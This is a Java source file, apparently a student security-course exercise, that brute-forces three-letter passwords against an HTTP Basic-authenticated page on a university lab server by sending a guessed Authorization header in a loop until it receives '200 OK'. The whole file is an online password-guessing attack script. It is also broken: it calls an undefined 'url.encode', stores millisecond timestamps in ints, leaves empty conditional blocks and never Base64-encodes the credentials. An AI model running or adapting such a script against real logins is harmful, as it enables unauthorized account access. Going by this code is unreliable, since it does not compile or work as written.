import java.net.*;
import java.io.*;

public class BruteForce
{

       public static void main  (String[] args)
       {

              String pwd = new String();
              String userpwd = new String();
              String reply = new String();
              int i,j,k;
              int startTime, endTime,totalTime;
              URLConnection connectionObj;
              startTime = System.currentTimeMillis();
              

         try {

         URL urlObj = new URL("http://sec-crack.cs.rmit.edu./SEC/2/");




              for (i=1;i<=58;i++)
              {
                  if (i<=26 || i > 32)
                  {
                     
                     
                  }

                  for (j=1;j<=58;j++)
                  {
                      if ((j<=26 || j > 32) && (i <=26 || i>32))
                      {


                         
                         
                      }

                      for (k=1;k<=58;k++)
                      {
                          if ((k<=26 || k > 32) && (i <=26 || i>32) && (j <=26 || j>32))
                          {


                             pwd = "" + (char) (i + 64) + (char) (j + 64) + (char) (k + 64);

                             userpwd = url.encode("",pwd);

                             connectionObj = urlObj.openConnection();

                             connectionObj.setRequestProperty("Authorization"," " + userpwd);
                             connectionObj.connect();
                             reply = connectionObj.getHeaderField(0);

                             if (reply.compareTo("HTTP/1.1 200 OK")== 0)
                             {

                             endTime = System.currentTimeMillis();
                             totalTime= (endTime - startTime)/1000;
                             System.out.println(pwd);
                             System.out.println("Total Time = " + (totalTime) + "seconds");
                             System.exit(0);
                             }
                             
                          }

                      }

                  }
               }

        }

        catch (MalformedURLException err)
           {
           System.out.println(err);
           }
       catch (IOException err)
           {
           System.out.println(err);
           }

       }




}